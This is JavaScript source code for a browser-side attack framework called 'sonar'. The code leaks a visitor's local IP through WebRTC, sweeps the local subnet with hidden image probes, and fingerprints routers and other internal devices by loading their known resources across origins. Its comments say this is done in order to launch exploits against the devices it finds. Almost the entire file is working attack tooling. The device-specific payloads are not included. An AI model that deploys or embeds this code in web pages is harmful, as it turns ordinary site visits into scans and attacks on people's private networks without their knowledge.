
var sonar = {
    &#39;debug&#39;: false,
    &#39;fingerprints&#39;: [],
    &#39;scans&#39;: {},

    /*
     * Start the exploit
     */
    &#39;start&#39;: function(debug) {
        if( debug !== undefined ) {
          sonar.debug = true;
        }

        if( sonar.fingerprints.length == 0 ) {
            return false;
        }

        sonar.scan_for_ips( function( ip ) {
            sonar.identify_device( ip );
        });
    },

    /*
     * Kicks off enumeration of devices (generating a unique id to keep track of the onload chain)
     */
    &#39;identify_device&#39;: function( ip ) {
        var resource_list = [];
        sonar.fingerprints.forEach( function( fingerprint, index, all ) {
            if( fingerprint.fingerprints.length &gt; 0 ) {
                var random_id = sonar.generate_random_id();
                sonar.scans[ random_id ] = {
                    &#39;offset&#39;: 0,
                    &#39;name&#39;: fingerprint.name,
                    &#39;fingerprints&#39;: fingerprint.fingerprints,
                    &#39;callback&#39;: fingerprint.callback,
                };
                sonar.check_resource_exists( sonar.scans[ random_id ].fingerprints[0], ip, random_id );
            }
        });
    },

    /*
     * This function keeps the records for what resources have been mapped to which hosts.
     */
    &#39;internal_host_manager&#39;: function( ip, resource, id, error ) {
        if( error ) {
            delete sonar.scans[ id ];
            return;
        }

        // If it&#39;s the last element then call it&#39;s callback.
        if( sonar.scans[ id ].fingerprints[ sonar.scans[ id ].fingerprints.length - 1 ] == resource ) {
            if( sonar.debug ) {
                alert( &#39;[DEBUG][&#39; + id + &#39;] Found &#34;&#39; + sonar.scans[ id ].name + &#39;&#34; at &#39; + ip );
            }
            sonar.scans[ id ].callback( ip );
            delete sonar.scans[ id ];
            return;
        } else {
            sonar.scans[ id ].offset++;
            sonar.check_resource_exists( sonar.scans[ id ].fingerprints[ sonar.scans[ id ].offset ], ip, id );
        }
    },

    /*
     * Browser fingerprints are loaded here
     *
     * Fingerprints are just arrays of resources such as images, css, and javascript that can be enumerated via external resource onload.
     * By checking for the existance of these resources we can identify routers and other internal devices and launch appropriate exploits.
     *
     * Example fingerprint data structure:
     * var fingerprints = [
     *  {
     *      &#39;name&#39;: &#39;ASUS RT N66U Exploit&#39;,
     *      &#39;fingerprints&#39;: [ &#39;/other.css&#39; ],
     *      &#39;callback&#39;: function( ip ),
     *  }
     * ]
     *
     */
    &#39;load_fingerprints&#39;: function( fingerprints ) {
        sonar.fingerprints = fingerprints;
    },

    /*
     * WebRTC Scanner Code
     * Some of the below code is taken from https://dl.dropboxusercontent.com/u/1878671/enumhosts.html
     * All credit given to them for a nice way to enumerate internal hosts :)
     * See also: https://hacking.ventures/local-ip-discovery-with-html5-webrtc-security-and-privacy-risk/
     */
    &#39;scan_for_ips&#39;: function( callback ) {
        var q = new TaskController(1);
        sonar.enumerate_local_ips( function( localIp ) {
            q.queue( function( cb ) {
                sonar.probe_network( localIp,
                     function( ip ) {
                         callback( ip );
                     },
                 cb);
            });
        });
    },

    &#39;probe_ip&#39;: function(ip, timeout, cb) {
        var start = Date.now();
        var done = false;
        var img = document.createElement(&#39;img&#39;);
        var clean = function() {
            if (!img) return;
            document.body.removeChild(img);
            img = null;
        };
        var onResult = function(success) {
            if (done) return;
            done = true;
            clean();
            cb(ip, Date.now() - start &lt; timeout);
        };
        document.body.appendChild(img);
        img.style.display = &#39;none&#39;;
        img.onload = function() { 
            onResult(true);
        };
        img.onerror = function() { 
            onResult(false);
        };
        img.src = &#39;https://&#39; + ip + &#39;:&#39; + ~~(1024+1024*Math.random()) + &#39;/&#39; + sonar.generate_random_id() + &#39;?&#39; + Math.random();
        setTimeout(function() { if (img) img.src = &#39;&#39;; }, timeout + 500);
    },

    &#39;probe_network&#39;: function(net, onHostFound, onDone) {
        net = net.replace(/(\d+\.\d+\.\d+)\.\d+/, &#39;$1.&#39;);
        var timeout = 5000;
        var done = false;
        var found = [];
        var q = new TaskController(6, onDone);
        for (var i = 1; i &lt; 256; ++i) {
            q.queue((function(i, cb) {
                sonar.probe_ip(net + i, timeout, function(ip, success) {
                    if (success) onHostFound(ip);
                    cb();
                });
            }).bind(this, i));
        }
    },

    &#39;enumerate_local_ips&#39;: function(cb) {
        var RTCPeerConnection = window.webkitRTCPeerConnection || window.mozRTCPeerConnection;
        if (!RTCPeerConnection) return false;
        var addrs = Object.create(null);
        addrs[&#39;0.0.0.0&#39;] = false;
        function addAddress(newAddr) {
            if (newAddr in addrs) return;
            addrs[newAddr] = true;
            cb(newAddr);
        }
        function grepSDP(sdp) {
            var hosts = [];
            sdp.split(&#39;\r\n&#39;).forEach(function (line) {
                if (~line.indexOf(&#39;a=candidate&#39;)) {
                    var parts = line.split(&#39; &#39;),
                        addr = parts[4],
                        type = parts[7];
                    if (type === &#39;host&#39;) addAddress(addr);
                } else if (~line.indexOf(&#39;c=&#39;)) {
                    var parts = line.split(&#39; &#39;),
                        addr = parts[2];
                    addAddress(addr);
                }
            });
        }
        var rtc = new RTCPeerConnection({iceServers:[]});
        rtc.createDataChannel(&#39;&#39;, {reliable:false});
        rtc.onicecandidate = function (evt) {
            if (evt.candidate) grepSDP(&#39;a=&#39;+evt.candidate.candidate);
        };
        setTimeout(function() {
            rtc.createOffer(function (offerDesc) {
                grepSDP(offerDesc.sdp);
                rtc.setLocalDescription(offerDesc);
            }, function (e) {});
        }, 500);
        return true;
    },

    &#39;generate_random_id&#39;: function() {
        function s4() {
            return Math.floor((1 + Math.random()) * 0x10000).toString(16).substring(1);
        }
        return s4() + s4() + &#39;-&#39; + s4() + &#39;-&#39; + s4() + &#39;-&#39; +
        s4() + &#39;-&#39; + s4() + s4() + s4();
    },

    /*
     * Internal host fingerprinting via SOP hacks
     */
    &#39;check_resource_exists&#39;: function( resource, ip, id ) {
        var full_source = &#39;http://&#39; + ip + resource;
        var element_id = sonar.generate_random_id();
        if( resource.toLowerCase().endsWith( &#39;.css&#39; ) ) {
            var resourceref = document.createElement( &#34;link&#34; );
            resourceref.setAttribute( &#34;id&#34;, element_id );
            resourceref.setAttribute( &#34;type&#34;, &#34;text/css&#34; );
            resourceref.setAttribute( &#34;rel&#34;, &#34;stylesheet&#34; );
            resourceref.setAttribute( &#34;href&#34;, full_source );
        } else if ( resource.toLowerCase().endsWith( &#39;.png&#39; ) || resource.toLowerCase().endsWith( &#39;.gif&#39;) || resource.toLowerCase().endsWith( &#39;.jpg&#39; ) || resource.toLowerCase().endsWith( &#39;.tiff&#39; ) ) {
            var resourceref = document.createElement( &#34;img&#34; );
            resourceref.setAttribute( &#34;id&#34;, element_id );
            resourceref.setAttribute( &#34;src&#34;, full_source );
        } else if ( resource.toLowerCase().endsWith( &#39;.js&#39; ) ) {
            var resourceref = document.createElement( &#34;script&#34; );
            resourceref.setAttribute( &#34;id&#34;, &#34;testresource&#34; );
            resourceref.setAttribute( &#34;src&#34;, full_source );
        } else {
            return false;
        }
        resourceref.addEventListener( &#34;error&#34;, function( event ) {
            document.getElementById( element_id ).remove();
            sonar.internal_host_manager( ip, resource, id, true );
        }, false );

        resourceref.addEventListener( &#34;load&#34;, function( event ) {
            document.getElementById( element_id ).remove();
            sonar.internal_host_manager( ip, resource, id, false );
        }, false );
        document.getElementsByTagName(&#34;head&#34;)[0].appendChild( resourceref );
    },
}

// Monkey patching JavaScript
function TaskController(numConcurrent, onDone) {
    this.numConcurrent = numConcurrent;
    this.onDone = onDone || function() {};
    this.pending = 0;
    this.queued = [];
    this.checkTimer = -1;
}

TaskController.prototype.deferCheck = function() {
    if (this.checkTimer != -1) return;
    this.checkTimer = setTimeout((function() {
        this.checkTimer = -1;
        this.check();
    }).bind(this), 0);
};

Element.prototype.remove = function() {
    this.parentElement.removeChild(this);
}

NodeList.prototype.remove = HTMLCollection.prototype.remove = function() {
    for(var i = 0, len = this.length; i &lt; len; i++) {
        if(this[i] &amp;&amp; this[i].parentElement) {
            this[i].parentElement.removeChild(this[i]);
        }
    }
}

Element.prototype.remove = function() {
    this.parentElement.removeChild(this);
}

TaskController.prototype.check = function() {
    if (this.pending &lt; 1 &amp;&amp; this.queued.length == 0) return this.onDone();
    while (this.pending &lt; this.numConcurrent &amp;&amp; this.queued.length &gt; 0) {
        try {
            this.pending += 1;
            setTimeout((function(task) {
                task((function() {
                    this.pending -= 1;
                    this.deferCheck();
                }).bind(this));
            }).bind(this, this.queued.shift()), 0);
        }
        catch (e) {
            this.pending -= 1;
            this.deferCheck();
        }
    }
};

TaskController.prototype.queue = function(task) {
    this.queued.push(task);
    this.deferCheck();
};

Array.prototype.contains = function(obj) {
    var i = this.length;
    while (i--) {
        if (this[i] === obj) {
            return true;
        }
    }
    return false;
}

Array.prototype.equals = function (array) {
    if (!array)
        return false;

    if (this.length != array.length)
        return false;

    for (var i = 0, l=this.length; i &lt; l; i++) {
        if (this[i] instanceof Array &amp;&amp; array[i] instanceof Array) {
            if (!this[i].equals(array[i]))
                return false;
        }
        else if (this[i] != array[i]) {
            return false;
        }
    }
    return true;
}


